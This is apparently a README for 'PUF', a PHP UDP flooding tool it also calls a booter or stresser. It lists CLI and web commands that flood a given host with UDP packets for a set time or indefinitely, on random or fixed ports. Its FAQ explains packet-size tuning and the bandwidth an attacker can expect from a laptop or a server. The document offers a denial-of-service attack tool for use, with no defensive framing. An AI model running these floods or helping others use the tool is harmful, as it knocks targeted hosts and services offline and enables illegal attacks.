PUF: Phate's UDP Flooder
===
You may call it whatever you like:
- PHP UDP Flooder
- PHP UDP Booter
- PHP UDP Stresser
- Or just simply PUF!

PowerPUF
---
PUF works smart. It runs from both CLI as from the web. They each have their advantages, so why not both? 

The CLI works with the following commands:
```
puf.php (shows help)
puf.php [host/ip] [time=300] [port=random] [size=optimised/cache]
puf.php 1.2.3.4 (floods host for 300 seconds on random ports)
puf.php 1.2.3.4 60 (floods host for 60 seconds on random ports)
puf.php 1.2.3.4 0 80 (floods host on fixed port, indefinitly)
puf.php 1.2.3.4 300 80 25000 (floods host for 300 seconds on fixed port with fixed packet-size, disabling optimised speed)
puf.php host.io 0 0 35000 (floods host on random port with fixed packet-size, disabling optimised speed, indefinitly)
puf.php host.io -nocache (optimised speed without cache)
puf.php -showcache (shows optimised speed/from cache)
```
The WEB works with the following commands:
```
puf.php?hostname=[host]
puf.php?hostname=[host]&time=[time]
puf.php?hostname=[host]&time=[time]&port=[port]
puf.php?hostname=[host]&time=[time]&port=[port]&size=[size]
```

Notice that the hostname is always required, and if you know what size works best for you (i.e. after a test run with cache enabled?) you should give the size in case cache does not work/the cache isn't valid anymore.

Wait whut, 'optimised speed cache'?
---
Indeed. The power of an UDP flood lies in the strength of the CPU, the size of the packet and the packets per second that are sent. You might think that sending over 50kB per packet "ups" the amount of mB/s of the flood, but that's not entirely right. So, we calculate the 'optimised speed' and store it. For the CLI, it's stored as a file (__FILE__.dat) and for the web version it's stored in $_SESSION. Small note, if you determine the size of the packet yourself, we skip the whole "we think this is better for you" part which saves you some time ;-) Please note, allthough we tried our best, it does depend on your upload speed as well. The calculations are done right and most of the time thei're pretty good, but no promises ;-)

Does this show the actual average MB/s?
---
Pretty much. In the end it has ups/downs, but the average is correct.

On server x i'm getting xx mB/s, on y i'm getting xxxx mB/s. What's the difference?
---
It's all a matter of how many packets can the server send per second. The optimised speed has the highest package per second/package size ratio. If you'd run this on a medium laptop, you will probably get around 50-80 mB/s. On the average server, you will get more like 300 mB/s - 750 mB/s. Because PHP can't multithread by default (yes yes, it is possible ;-)) you can't run multiple threads on multiple processors. That's limiting the "true" power of an UDP flood. Sample runs with an Multithreading-Perl script showed a power increase of 20-35%! Nonetheless, this is one of the most powerfull flooders written in PHP at this very moment.
